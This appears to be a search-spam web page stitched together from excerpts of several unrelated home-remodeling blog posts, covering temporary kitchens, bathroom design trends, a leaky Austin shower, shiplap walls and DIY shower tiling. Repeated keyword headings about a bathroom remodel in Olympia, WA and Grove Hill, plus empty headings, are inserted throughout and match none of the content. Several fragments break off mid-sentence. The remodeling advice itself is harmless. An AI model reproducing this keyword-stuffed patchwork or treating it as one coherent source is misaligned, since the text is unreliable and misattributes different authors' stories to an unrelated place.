office,&#x201d; says Jennifer Bartlett, a graphic designer who lives with her sister Wendy and their dog Chuckanut. &#xa0;They undertook a main floor and basement addition in 2008 that included a new home office, kitchen and guest bath. &#xa0;&#x201c;I find it difficult to work in new spaces efficiently. Being creative is hard for me in new places,&#x201d; says Bartlett. &#xa0;&#x201c;We really could not imagine not staying in the house.&#x201d;</p>   <div>    <p>Bartlett&#x2019;s photo illustration of all the frozen food she made in advance of her remodel.</p>   </div>   <p>Bartlett and her sister Wendy love to cook, and the kitchen was the centerpiece of their addition. &#xa0;They carefully thought through how they would cope without a kitchen, and decided to cook ahead. &#x201c;The remodel was estimated to last 6 months. So I bought a freezer and started cooking. I use containers from Cash and Carry that come in 1- and 2-cup increments,&#x201d; says Bartlett. &#xa0;&#x201c;I cooked for two months before the remodel and made all types of soup and casseroles. I also made a large number of burritos. We froze entrees in vacuum-seal bags. We moved the kitchen into the living room, which functioned as my office, the living room, and now, the kitchen.&#x201d;</p>   <p>The biggest downside for the Bartletts was not having a kitchen sink. &#x201c;The second time the table with just-cleaned dishes collapsed and fell down the stairs, my sister lost it. There is just something wrong about doing dishes in a bathroom anyway.&#x201d;</p>   <p>Wendy Quaale concurs. &#x201c;Didn&#x2019;t expect the anguish of washing dishes in the bathtub,&#x201d; she commented, thought she and her husband Ken were glad to be onsite throughout during their master suite and kitchen addition, despite the dust and noise. Ken has a background in HVAC, so installed ductwork and painted. &#x201c;It was important to us to be here as much as possible, making decisions.&#x201d;</p>   <p>Whether you stay or go, remember that your day-to-day routine will change. The Sheridans, who moved out, took few items and clothing with them. &#x201c;During the weeks we were out of our house, we enjoyed a lot of indoor picnics instead of gourmet meals.&#x201d;</p>   <p>The same was true for Nancy Stillger, who stayed in her home with her husband and daughter. Their kitchen and exterior remodel took place over a summer, when their daughter was gone for</p>   <div>    <p>The Stillgers created a temporary kitchen while their new kitchen was under construction</p>   </div>   <p>a month and they knew they could grill a lot. &#x201c;[We moved] large items like our refrigerator downstairs in order to have a temporary kitchen.</p>   <p>Lynn Tutak and her husband followed suit during their kitchen remodel. &#x201c;We decided where we would make our temporary kitchen space and moved any unnecessary items upstairs. We packed our kitchen up, only keeping a couple of plates, bowls, cutlery, etc. We purchased an inexpensive microwave and electric tea kettle, which have been used every day. We used our gas grill outside and our Crockpot a couple of times.&#x201c;</p>   <p>&#xa0;</p>   <p>Site protection is critical if you decide to stay. &#xa0;The temporary walls, doors and zipwalls with Visqueen not only reduce dust, but can also keep pets and kids out of the work area. In the Tutaks&#x2019; case, their cats were really disturbed initially by the noise and disruptions of construction. &#xa0;The installation of a temporary door eased that worry by ensuring that they would not escape.</p>   <div>    <p>A temporary door kept the cats on the other side while construction was under way.</p>   </div>   <p>After that, Lynn says, &#x201c;We pretty much fell into a routine of &#x201c;living&#x201d; in our living room. I was the one who was home during some of the work days and adapted quite easily. However, I did plan ahead. I had projects lined up to work on upstairs in our closets and in my craft room. I did a lot of knitting (Christmas presents) and this worked quite well for me.&#x201d;</p>   <p>Making a final decision about what&#x2019;s right for your family during your remodel involves thinking through what&#x2019;s most important to you, and what kind of disruptions are manageable for you.</p>   <p>But even with smaller remodels, refinishing or adding to wood floors means leaving your home twice for a few days during the project to allow the finish to cure. So even though you&#x2019;re staying, you still need to leave at least for a few days.</p>   <div>    <p>Temporary walls and visqueen can help keep dust down during a remodel.</p>   </div>   <p>The Bartletts are taking the knowledge gained from their first remodel and applying it toward the upcoming remodel of their upstairs and living room. &#xa0;They plan to stay again.</p>   <div>    <p>The Bartletts&#x2019; temporary kitchen in their living room</p>   </div>   <p>&#x201c;We will plan several trips to our Dad&#x2019;s and our brothers so we will be out during key times, like when the floors are finished. We are planning on having all the cabinetry finished off site. We are getting rid of some furniture so there will be less to store, but we might still need a storage unit for a short time.&#x201d;</p>   <p>Planning ahead is key, whether with pre-cooked meals, plans for pets and furniture or taking the leap and renting another place. &#xa0;The right plan depends on your unique situation. &#xa0;Stillger, with her newly remodeled kitchen, is satisfied her family made the right call. &#xa0;&#x201c;I don&#x2019;t think there is anything we would do differently. &#xa0;A remodel has an impact on your day to day life &#x2013; but the end result is worth it!&#x201d;</p>  </div>

   <div>   <p>Now that we have lived through the economic and political ups and downs of 2016 and even survived the end of the world, many homeowners are actively pouring in their time and resources in remodeling their homes. And guess what? Bathroom remodeling and renovation tops the list of these home improvement projects.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Having busy, often stressful lives, it is becoming clear that for many of us bathrooms are becoming a lot more than just functional spaces in our homes. From using the bathroom to look sharp for work in the morning, to occupying the space to unwind after a long day during the night, we are looking for more beautiful, stylish, luxurious bathroom spaces. Innovations in bathroom design, decor, vanities and accessories keep on multiplying, so there is no shortage of creative ideas and cutting edge products to help bring you closer to realizing your dream bathroom project.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>To have a truly contemporary bathroom and take advantage of all the latest design developments and products, check out our list of Bathroom Remodeling Trends for 2015 and 2016.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><strong>Tile Extravaganza</strong></p>   <p> If you thought tiles were boring and had an office-like feel, think again! Today, tiles are one of the best ways to give your bathroom a total make-over and achieve a unique look. You are no longer confounded to traditional ceramic tiles of standard sizes and colors. Instead, you can let your imagination run wild with a wide range of possibilities for tile materials such as porcelain, glass, metal, stone in addition to the good ol&#x2019; ceramic. Each material offers a distinct look and comes in wide range of colors, sizes. Of course, for truly upscale and luxurious bathrooms you can go all out and custom order your own tile patterns. You can do as much or as little with tiles as you like, from having accent tiles around your vanities, to floor or wall tiles, to covering your entire bathroom with tiles from floor to ceiling.</p>   <p><strong>Say Yes to Luxury</strong></p>   <p> One trend that is hard to ignore is the collective desire for a truly luxurious bathroom space. The feeling of a personal spa, a safe haven within your own home. One way to achieve this look and feel is to get rid of the traditional big bulky tub and install a beautiful soaking tub that you can sit and relax in for hours by yourself or with someone special. Another highly option is to go for an expanded, walk-in shower space with frame-less glass, benches, niches and dual shower heads.</p>   <p>When it comes to vanity tops, granite is no longer the only luxury option. More and more homeowners are discovering the unique beauty of such upscale materials as travestine, quartz, and Calacatta marble.</p>   <p><strong>Heated Flooring</strong></p>   <p> Increasingly, homeowners are seeking comfort in their bathroom spaces. Nothing is more cozy and comfortable then stepping onto a warm floor after the shower, rather than being shocked by freezing cold floor tiles. Consequently, more and more homeowners are opting to heat their bathroom floors and there is a wide range of possibilities to choose from. Consider such options as radiant electric heating, a special mesh that is placed under tiles when they are set and is connected to a thermostat on the wall, electronic heat-mat systems that can be placed both under the floor and under the walls. Many of these options use little energy and will not cost you thousands of dollars to purchase and install.</p>   <p><strong>Green bathrooms</strong></p>   <p>Environmental concerns will continue to be on the minds of many homeowners, which will have a tremendous influence on their choices when it comes to home improvement. The demand for green building materials, and bathroom accessories will keep on growing in 2016, contributing to a steadily growing stream of Eco-friendly products. One easy and fairly inexpensive way to incorporate green accessories into your own bathroom is to go for an Eco-friendly shower head and faucet. Another product to consider is low flow toilets that regulate the amount of water released. Depending on your water usage, you may want to look into another popular energy saving product: an on-demand water system. This system instantly heats water for your bathroom when you turn it on, so that you do not waste energy with a traditional water heater, which needs to be constantly on to keep the water hot. Finally, if you go for heated flooring, it is a great idea to install a timer, so that you do not waste waste energy heating up the floor when no one is at home.</p>   <p><strong>Functionality</strong></p>   <p> The economic downturn has shifted the way many people are choosing to spend their hard-earned dollars on remodeling. There is a noticeable preference for planning, less careless spending on useless accessories, and an overall effort to achieve the most functionality in the renovated space. Bathrooms are no exception, and this is especially true for homeowners who are choosing to stay in their current homes and are looking to maximize the functionality of their bathrooms. Space saving shelves, cabinets, customized built-in cabinet solutions replace the bulky accessories that used to overcrowd bathroom spaces. Overall, achieving the feeling of open air and space is becoming of paramount importance in modern bathrooms.</p>   <p><strong>Original Color Palette</strong></p>   <p> In 2016 there is one color that is everyone&#x2019;s kid on the block and that is charcoal. Hailed as the new black, this color is synonymous with sophisticated yet simple spaces. This unique color is highly attractive to the eye, being a blend of chocolate grey and green hues. You can utilize this color in many ways from choosing it as a color for your bathroom cabinets, to making it the color of your walls.</p>   <p><strong>Summary</strong></p>   <p>Overall, this will be the year of bold colors and using colors as accents. However, it is important to remember that its best to choose more neutral shades for permanent areas in your bathroom such as tiles, and choose bright / bold colors for areas and things that can be easily replaced and transformed without too much hassle and money. You do not want to spend thousands of dollars on expensive emerald green tiles only to realize one year later that you are tired of being hit in the face with this color every time you walk into your bathroom.</p>   <p><strong>Author</strong></p>   <p>This guide was written by Alex.

Think of it as &#x201c;This Old House&#x201d;, except instead taking you through the remodel of a charming 400 year old home in New England, I&#x2019;m taking you through the repair of a leaky bathroom in a mid-90&#x2019;s mass-produced planned-community home in Austin, TX.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>The events up to this point have been thoroughly documented in not one, not two but THREE posts.</p>    <p>Let me catch you up, there has been:</p>    <p> (The discovery phase)</p>    <p> (The denial phase)</p>    <p> (The panic phase)</p>    <p>For those of you who prefer Cliff&#x2019;s notes, here&#x2019;s how a simple shower leak has evolved into an entire bathroom remodel in 10 easy steps:</p>    <p>1. It started with identifying an odd smell in our master bedroom closet. Surely it must just be the shoes or the laundry, <em>right?</em></p>    <p>2. &#x201c;Hey, why&#x2019;s there a giant wet spot in our closet? Let&#x2019;s pretend the cats did it and just continue to step over it for a week before we actually investigate further.&#x201d;</p>    <p>3. Oh Crap</p>    <p>4. One morning, after closing the bathroom door to keep the cats from puncturing their little paws on the nails in the carpet strip, we discover that a) The door is locked from the inside and b) Whoever installed the doorknobs didn&#x2019;t use the kind where you can pop the lock open with a pin so instead my husband MacGyvered it open with a slap bracelet.</p>    <p>&#xa0;</p>    <p>5. Our doorknob looked like this for about 2 months</p>    <p>6. Husband to the rescue!</p>    <p>7. There were months of material research that required lots of Nintendo DS bribery</p>    <p>8. As with any house project of mine, there were prototypes involved</p>    <p>9. The contractor came with his plumber a couple days ago to check out some stuff and the sledgehammers started swinging. He informed me we can start the next day and I get my marching orders to clear out every cabinet in the bathroom as well as the entire master closet. I estimated two hours&#x2026;.it actually took closer to four. We have entirely too much stuff. Realizing just how much stuff we have changed my entire tune about this process from &#x201c;<em>what a pain in the ass&#x201d;</em> to &#x201c;<em>wow, we&#x2019;re awfully lucky to be living a life where remodeling a bathroom is considered a &#x2018;problem&#x2019;</em>&#x201d;</p>    <p>10.

   <div>   <p>Hi everyone! I&#x2019;m in the midst of remodeling our main upstairs bathroom and I wanted to share my inspiration as we continue working on the project. So far we have some ship lap on the walls, new knobs on the vanity along with a new stain color (but not sure if it&#x2019;s staying), a big hole where the lights are being re-wired, and the lights are almost ready to be installed.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Once we have the lights up, we just need to patch the wall, and finish the ship lap over the vanity. Seems easy enough, but it&#x2019;s still a ways to go! We&#x2019;ve had a lot of sick kiddos, including myself, that have put the project on hold, but that&#x2019;s how life works! I&#x2019;m hoping we can finish a good amount of it before we go on vacation for spring break on the 20th. That&#x2019;s really hoping for a miracle, haha!</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Here are my inspiration photos that I love and tried to incorporate little pieces of them into the new bathroom. I&#x2019;m loving the modern farmhouse look, but I&#x2019;ve also been a vintage glam girl too so there might be a mix of the 2.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <div>    <p>Houzz</p>   </div>   <div>    <p>Decor Pad</p>   </div>   <div>    <p>Decor Pad</p>   </div>   <div>    <p>Decor Pad</p>   </div>   <div>    <p>Decor Pad</p>   </div>   <div>    <p>Decor Pad</p>   </div>   <p>I love Joanna and Chip from Fixer Upper and I love how she uses the ship lap to add texture to the walls. I decided to cover all the walls of the bathroom with ship lap so that&#x2019;s phase 1. Here&#x2019;s a sneak peak of one of the walls with plywood strips used as the ship lap before it was painted. The kids loved helping find the studs as always!</p>   <p>I decided to keep the vanity a weathered oak stain with some dark oil rubbed knobs because I wanted the warm wood to be a contrast to the white walls. I may be changing the vanity color to a light gray or blue depending on how I feel once the lights and mirror are up. </p>   <p>I want to get rid of the old cabinet over the toilet and add simple wood distressed shelves with beautiful storage items to hide our mess. I&#x2019;m thinking like these from Target will work nice! I bought a tilt Pottery Barn Kensington mirror in Satin Nickel for over the vanity and it&#x2019;s gorgeous! I figured I would splurge on the mirror since I saved a ton of money finding cheaper lights at Home Depot than I expected. Here&#x2019;s the mirror..</p>   <div>    <p>Pottery Barn Kensigton Mirror</p>   </div>   <p>The light sconces I originally wanted were Bryant Sconce lights which are gorgeous, but come at a price of $200 each. I found these lights at Home Depot that are very similar with a glass shade for only $30 each! And that allows me to splurge on my mirror! I bought the lights in Satin Nickel, but once I get them on the wall I think I may like them in oil rubbed bronze better so I will be spray painting them if that&#x2019;s the case.</p>   <p>These are the Bryant Sconces I wanted.. &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0;And these are the Home Depot Sconces&#x2026;</p>   <p>&#xa0;</p>   <p>Sacrifices need to be made to get what you want and the framed tilt mirror was more essential in my design because I wanted a mirror wide enough and also tall enough to make the room feel taller. I think it was a good choice!!</p>   <p>Watch for my updates as I finish up the bathroom and lets hope it&#x2019;s soon! I hope you got some good ideas from my inspiration pictures like I did! Have a great Friday!</p>   <p>&#xa0;</p>   <h5><span>Disclosure: This post may contain affiliate links that when clicked and purchased earn commission percentages, but my recommendations are my honest and truthful opinions.</span></h5>  </div>

   <div>   <h2><b><u>Master Bath Remodel #1</u></b></h2>   <p>We have a ton of remodeling we want to do to our master bathroom but of course we can only afford a little at a time. The first of our remodel was the most pressing, we had a window that leaked that we could not seem to fix so instead of replacing out the window we remodeled the entire wall. Our original plan was to rock the entire wall and add the fire place, but of course we could not afford the rock right now so instead Shawn came up with the great idea of doing wood. It turned out gorgeous. We will eventually have to redo the tile around the tub to something else that matches (possibly rock).</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <span>Share this:</span>   </div>  </div>

   <div>     <p>Part One </p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The picture above is how the guest bathroom looked the day Karen purchased her home.&#xa0; I say Karen and not our home, because at this point we had not met each other yet.&#xa0; The guest bathroom was decorated in navy blue and chrome silver wall paper, yellowish green tile, and a lacy fabric drapery over the tub.&#xa0; The guest bathroom only had a bathtub with no shower head.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Karen&#x2019;s first few steps of the guest bathroom&#xa0;remodel process involved taking down the drapery, removing all the wall paper and the old light fixture. &#xa0;Her Dad did a ton of work removing the upper tile surrounding the bathtub and replaced the old sheet rock with concrete backer board. &#xa0;He also re-plumbed the bathtub faucets so that there would be a working shower head and bathtub. </p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Karen then met me and all work on the house ceased for a good long while.&#xa0; One week, during our courtship, Karen was on a weeklong trip being a sponsor for the youth group at her church and I was asked to house sit.&#xa0; During the week I was rather bored and decided to start taking down some of the old wall paper that was up.&#xa0; When Karen got back from her trip I think she was a little surprised that I had taken down most of her living room wall paper.&#xa0; We had a nice little &#x201c;discussion&#x201d; about how I probably should not have done that without talking about it first, but then I got her to see that I was actually helping her out.&#xa0; Plus, if our relationship did not work out then she could look at it as free labor.&#xa0; Luckily (in many ways) our relationship did work and my work on the house during that week was not in vain.</p>   <p>When we got married in June of 2008 I was already off for summer break (I am a teacher).&#xa0; I started working on the guest bathroom.&#xa0; We decided that we were almost going to do a complete remodel.&#xa0; The only thing that was going to stay was the vanity cabinet and the actual bathtub.&#xa0; Everything else was going to be a complete redo.&#xa0; I started by removing the old toilet and using a jack hammer to get up that wonderful tile.&#xa0; I say &#x2018;that wonderful tile&#x2019; because I do not think who ever put it down used&#xa0;just any ordinary substance.&#xa0; That tile was a real bugger to remove. </p>   <p>Our next step was to patch some holes in the sheet rock.&#xa0; This is where Karen got to show off bit of expertise.&#xa0; The previous owners&#xa0;had the toilet paper holder directly across from the toilet on the opposite wall. &#xa0;This was a problem because&#xa0;&#xa0;you could not even reach it from the toilet, so we easily decided that had to change.&#xa0; Once it was removed there was just a crazy hole in the wall. &#xa0;So, Karen patched it and filled the joints and now you cannot even tell it was there! (Can you tell I&#x2019;m feeling a little proud of her?) </p>   <p>After patching and sanding and smoothing several times we textured the walls and painted the bathroom a beautiful shade of blue and put in a new light fixture we had gotten from Home Depot. </p>   <p>The next step was installing our tile.&#xa0; Check out our guest bathroom remodel part 2 to see how the tile turned out.</p>   <center>    <div>     <div>      <table>       <tbody>        <tr>         <td> <p>Get free daily email updates!</p> </td>         <td><p>Follow us!</p> </td>        </tr>       </tbody>      </table>     </div>    </div>   </center>   <div>    <div>     <h3>Related Posts</h3>    </div>   </div>    </div>

It&#x2019;s just so BASIC. I mean, it functions. It has a sink, a toilet, and a short shallow bathtub/shower.

I only got one coat on the walls, and it still looks pretty splotchy, but much improved to the tan that it went on top of. Downside, the brown tile, looks so much more brown now.

   <div>   <p>So if I&#x2019;m being completely honest with you, I severely underestimated this project. While pondering my summer of freedom (post-graduation, pre-career), I noticed the cracking grout in our master bathroom shower. Definitely bad enough to require re-grouting, and the shower itself was just outdated enough (and gross enough, let&#x2019;s be honest) to make a re-do the more appealing option. What I had in mind was ripping out the old tile and slapping up some new stuff. Seemed pretty simple to me, especially since I had a bit of experience in tiling already (ahem, as a teenager, helping my dad). But then good ole Pinterest had me dreaming of a built-in shelf in the shower. If I was already going to put the effort into re-tiling, shouldn&#x2019;t I stretch a little bit more and go for the gold?&#xa0;</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Thankfully, in a weak moment of daughterly love, my Dad agreed to come stay with us for a few days and help me with my project, making the dream recessed shower shelf attainable. However, this cranked up the complexity of my project. No longer could I quickly rip out and replace the tiling. Oh, and my dad kindly pointed out my naivete in thinking that I wouldn&#x2019;t need to remove our toilet and vanity. See, definitely underestimated.&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Fortunately for us, most everything went off without a hitch (take that, every remodeling show on HGTV!) I did most of the demo before my dad came up. First, removing the shower door and other hardware. Second, ripping out old tile. Third, ripping out backer board (which was mostly drywall &#x2013; aka: the wrong material for in a shower!)</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>Bathroom before, sans shower door</p>   </div>   <div>    <p>Ripping out tile</p>   </div>   <div>    <p>Ripping out backer board</p>   </div>   <p>Next, we set out to frame our shelf. Since the rear wall in our shower is a load bearing wall in our house, we wanted to cut as few of the support beams as possible. This was a bit of a bummer, because it limited the size of the shelf &#x2013; but realistically it would still be large enough for all of our things. One of the best things we did here was plan to size the box so that my shampoo bottles would fit standing up (uh, hello, MOST important!) and so that we could fit a full sheet of glass tile back there without cutting it. After that was framed, covered the structure with cement board (the correct product for inside of a shower) and taped the seams with fiberglass tape and thinset mortar.&#xa0;</p>   <div>    <p>Framing complete for the shelf</p>   </div>   <div>    <p>Durock cement board up and taped</p>   </div>   <p>Next was tiling! (Finally!) We started with the ceiling, because starting with the hardest part is always a great idea (note the sarcasm). In all actuality, even though it was difficult and I may have been a bit snippy to my dad, starting with the ceiling was the correct way to lay the tile. We then did the back wall, including framing the shelf with bullnose tile. (Bullnose tile is tile that has a rounded edge, used in places where an edge will show).&#xa0;</p>   <div>    <p>Day 1 of tiling complete!</p>   </div>   <p>The bad news is that&#xa0;this was the last day that my dad was able to help me. The good news is that&#xa0;finally being able to see the &#xa0;the bathroom take form was a great motivator! Finishing the rest of the tile took me a few more days &#x2013; and I will fully admit that since I was on my own time, when I got to a difficult part, I gave myself a generous break . After finishing the tiling, grouting went surprisingly fast. This was the part of the project that I was dreading the most, and it went really quickly. It was also extremely satisfying to see the look of the tile with the grout.</p>   <div>    <p>Close up on the grout</p>   </div>   <p>Aaand this is where the project got annoying. After painting, I re-installed the toilet and vanity (with a new faucet, yay!) with no problems. I then sat down to read the instructions for the super fancy shower door that we had purchased, only to realize that I had purchased one too tall for our space (doh!). No matter, I decided to work on the other shower hardware. Well, that too proved to be difficult because our wall was thicker and the cartridge didn&#x2019;t stick out far enough. I wasted about another week getting a new shower door and exchanging parts, but eventually was able to get it completed.&#xa0;</p>   <div>    <p>All done grouting</p>   </div>   <div>    <p>Close up of the shower floor</p>   </div>   <div>    <p>Close up of the shelf</p>   </div>   <p>Today was the first day that we were able to shower in our new bathroom, and we absolutely love it! I still have a few tiny things to finish up here and there (covering nails with spackle, grouting the trim), but we&#x2019;re back to a fully functioning bathroom. We are extremely happy with the results, and I&#x2019;m proud of the money we saved by doing it ourselves. I am extremely grateful to my dad for agreeing to help me (when he had previously swore off all things tile), and would not have been able to do this without his help. Here&#x2019;s one last picture of the finished product!</p>   <div>    <p>Ready for a new rug and different towels!</p>   </div>   <p>&#xa0;</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

Create interest on the ceiling with a pop of color, fashion stripe with two shades of the same color or try a bold wall covering (make sure you select a paper that is rated for moist spaces) or even use a few colorful accessories to bring your personal style to the space.</p>   <p><em>(This marble tile was quite pricey per square foot, but by cutting the 12&quot; square piece into three 4&quot; strips we only need two square feet to make a major impact on this classic black and white bathroom)</em></p>   <p>I hope these tips get you thinking about how to make the most out of your remodeling dollars!</p>   <p>Cheers,</p>   <p>Laura</p>  </div>  
   <div>   <p><span>Well, it&#x2019;s definitely the dead of winter. It&#x2019;s snowed every day this week. Despite the added stress it adds&#xa0;to the&#xa0;drive to work, It&#x2019;s actually very beautiful. Monday&#x2019;s snow was wet and heavy and just hung on all the tree branches. I had to drive to the dentist to have two teeth extracted for my implants. It was terrifying driving on untreated roads. At least there weren&#x2019;t many people on the roads with me!&#xa0;</span></p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>This may not look like much, but it&#x2019;s about 4&#x2033; of snow on an untreated road.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <p>There&#x2019;s another storm predicted for Sunday evening into Monday. This one could be a whopper for us, or maybe not. We&#x2019;ll have to wait and see. Someone told me on the phone today that it&#x2019;s 41 days until Spring. She was from Boston who had over 30&#x2033; of snow with this same storm (above) where we got 5 or 6&#x2033; total. She was telling me that Nantucket was without power and they were still trying to get&#xa0;guests off the island. I was grateful that the winter hasn&#x2019;t been that harsh for us. I hung up with her and my sister text me that this big gigantic storm was coming for Sunday.&#xa0;<em><span><strong>Oh the irony.</strong></span></em></p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><span><strong>It&#x2019;s wintertime.</strong> </span>And it&#x2019;s the same every year. It&#x2019;s project time for me. So this year it&#x2019;s the master bathroom. When we built/bought the house, it was a spec home, which meant the builder started to build the home and then sold it to us&#xa0;before it was completed. The builder had to choose many items that were ordered ahead,&#xa0;and everything in the bathroom was their choice. It was pretty generic &#x2014; and cheap. I didn&#x2019;t mind it at first when everything looked new, but as it got older, the cheap stuff just got ugly. I&#x2019;d rather not have it if it&#x2019;s cheap. Or I&#x2019;d rather pay a few hundred dollars more to have it done right the first time. A light fixture at $79 versus $99&#xa0;&#x2014; that&#x2019;s a no brainer. But I guess for a builder, every $20 they save adds up over 100 houses x 100 light fixtures. And so on.</p>   <div>    <p>Wide-planked, engineered hardwood flooring.</p>   </div>   <p><strong><span>The Winter Blues</span></strong>&#xa0;&#x2014;&#xa0;blue will be a dominant color for the project &#x2014; from the countertops to the tile in the shower to the new rug in the bedroom &#x2014; so I&#x2019;m calling this my&#xa0;&#x201c;winter blues&#x201d;&#xa0;project. I designed the bathroom using Adobe&#xa0;Illustrator and we met with a couple contractors. We chose one who had some excellent suggestions and a beautiful portfolio. He still disagrees with us on the hardwood floor in the bathroom, but I want it to match the new floor he&#x2019;s putting in the bedroom. Plus, it&#x2019;s just Tom and me and I read quite a few articles on the use of&#xa0; as an excellent choice for the bathroom. We will be extra careful not to get water all over it. The flooring is going to run horizontal in the bedroom and vertical in the bathroom for a lovely transition. We&#x2019;re removing the standard door and putting in french-like doors that will open out.</p>   <p>We&#x2019;ve scrapped the &#x201c;soak tub&#x201d;. We never use the tub and it collects dust and cat hair, and the grout is disgusting. Seriously, the tub looks like it&#x2019;s 50 years old. It&#x2019;s gone&#xa0;&#x2014;&#xa0;trashed. That opens up half of the bathroom. We&#x2019;re putting in a mega-shower. All glass with a sliding door. We opted out of a&#xa0;swing door to ensure that we&#x2019;ll get less water on the floor. We&#x2019;ve been to hotels where we&#x2019;ve had to line the floor with towels, because you&#x2019;d open the door and water would gush down the door and all over the floor. We haven&#x2019;t selected the shower tile yet &#x2014; not until we determine the countertop.</p>   <div>    <p>Recycled glass terrazzo.</p>   </div>   <p><span><strong>The countertop will be the show piece.</strong>&#xa0;</span>I&#xa0;start with a focal point and design&#xa0;from there &#x2014; it&#x2019;s how I&#xa0;get a very consistent and well&#xa0;coordinated&#xa0;room. I&#x2019;m not an interior designer, even though I love to do it. We&#x2019;re going to tomorrow talk to them about using&#xa0; for the countertop and ledges along the shower. IceStone is terrazzo, a recycled material made of broken glass and a composite material. You can use it for all kinds of applications, including flooring. I love it because it&#x2019;s recycled and just so original. I used terrazzo for my &#xa0;a few years ago&#xa0;and it makes the entire room!&#xa0;If we&#x2019;re a definite go for the &#xa0;color, the rest of the bathroom will&#xa0;come together quickly.</p>   <p>Our cabinets will be&#xa0;an antique white to contrast the dark hardwood and all of our hardware and fixtures throughout will be the oil-rubbed bronze.</p>   <p>Our contractor has moved us up from a May remodel to a February 23rd start. So now we&#x2019;re on a fast track and I love it! Having a condensed timeline will actually help us focus and make decisions quicker! Stay tuned for a picture of the final remodel in March. And by that time, we&#x2019;ll be&#xa0;saying goodbye to&#xa0;the last few days of winter.</p>   <p><span>Always B E L I E V E !</span></p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>

We&#x2019;ve not re-coated it yet, but it&#x2019;s a great option!</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <p>Notice how the tile at the back of the tub is narrower at the right side and wider toward the drain? It&#x2019;s not a mistake, the older tubs are like this so that the water will drain out &#x2013; check this if you are considering !! (Put a level on the edges to confirm if it&#x2019;s angled or level.)</p>   <div>    <p>We painted the trim a white that contrasted with the &#x201c;bright porcelain&#x201d; white of the tile and fixtures. Better to be obviously different than a bad match!</p>   </div>   <p>Design-wise we stuck with to match the rest of the house &#x2013; it&#x2019;s pretty straightforward. The fun part was the wainscotting which I drew versions of directly onto the plaster walls. This helped me figure out sticky issues such as: How high should it be? How should it be divided? But what if the panels are not the same size? How will it meet the window and mirror trim? What will it really look like? Drawing full-scale onto the walls is a really helpful (fun!) trick. Use chalk and erase gently with a wet rag if you plan to keep the wall &#x2013; I didn&#x2019;t, it was all coming down to allow for new insulation and plumbing.</p>   <div>    <p>I think it&#x2019;s better to NOT line up the new with the old &#x2013; ex: the window stool and the wainscotting.</p>   </div>   <p>The new tub tile runs to the ceiling &#x2013; this gives a small room the illusion of height and a really nice, finished look. Plus it works great for tall people as you can raise the height of the shower head.</p>   <div>    <p>The existing walls were very out of square so we decided to hire tiling help. I just want to point out the artistry of his work &#x2013; note the outside corner on the left, see the basket weave corner? And the inside corners were cut to appear the same size as the other tiles.</p>   </div>   <p>In addition to what you <em>can</em> see in my photos there are a few things you <em>can&#x2019;t</em>&#x2013;</p>   <ul>    <li>We saved $$ on this project by doing our own design and demo. We hired Noel Canfield, 510-301-6513, to complete the finish work and tiling &#x2013; and we&#x2019;re glad we did. He&#x2019;s an artist and fun to work with!</li>    <li>When the walls were open we insulated a waste (yes, waste) pipe coming from the 2nd floor bath. This helps dampen the flushing sounds.</li>    <li>It would have been misery to remove the old floor tile, so we set the new hexagonal tile on top of the old and added an oak threshold to transition from the hallway hardwood to the new, higher tile floor level.</li>    <li>Used a medium grey grout to emphasize the subway tile pattern, tie into the darker wainscotting and &#x2013; bonus! &#x2013; hide the dirt. I&#x2019;ve used white grout before and I will nevereverever do it again. Ever &#x2013; even with a sealant.</li>    <li>Intentionally chose an off white paint for the trim to contrast with the &#x201c;bright white&#x201d; porcelain fixtures and tile.</li>    <li>Through trial and error we&#x2019;ve tried numerous types of caulk for the tile to tub joint and have finally found what seems to be an ideal product &#x2013; , a 100% silicone caulk that comes in 19 different colors. You may be able to get it at your local tile shop or you can order it online. You can&#x2019;t paint 100% silicone, so it won&#x2019;t work everywhere, but it is <em>so</em> great in this application.</li>    <li>Always add a fan!</li>   </ul>   <p>Here&#x2019;s we used, we had wanted the wainscot trim to be a bit thinner than the window trim but it wasn&#x2019;t going to work out&#x2013; they wound up needing to be the same thickness. To give the illusion of the wainscot sitting behind the window trim, we painted the wainscot a greyish brown and then (Heidi, who doesn&#x2019;t drink coffee) painted a really straight line where they met. It&#x2019;s a great optical illusion (see below)</p>   <p>So, if I had this project to do over again there are a few details I 